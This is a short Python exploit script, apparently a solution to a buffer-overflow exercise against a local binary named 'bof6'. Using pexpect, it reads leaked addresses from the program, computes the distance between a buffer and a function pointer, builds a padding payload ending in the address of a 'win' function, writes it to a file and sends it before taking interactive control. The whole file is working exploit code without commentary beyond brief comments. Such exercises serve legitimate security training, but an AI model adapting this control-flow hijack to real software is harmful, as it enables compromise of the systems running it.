#!/usr/bin/env python3
import pexpect

io = pexpect.spawn('./bof6')
# Reading addresses
io.expect(': 0x')
fp_addr = int(io.readline().decode().strip().split()[0],16)

io.expect(': 0x')
buffer_addr  = int(io.readline().decode().strip(),16)

io.expect(': 0x')
win = io.readline().decode().strip()
win_addr = int(win,16).to_bytes(4,'little')
print(win)
print(win_addr)
#Preparing payload
#Calculating the distance between buffer and pointer
buffer_len = abs(fp_addr-buffer_addr)

#Preparing payload to override *fp
payload = b'A'*buffer_len+\
	win_addr
print(payload)
#Saving payload to file 
with open('input.txt','wb') as f:
	f.write(payload)

#Exploit
io.sendline(payload)
io.interact()
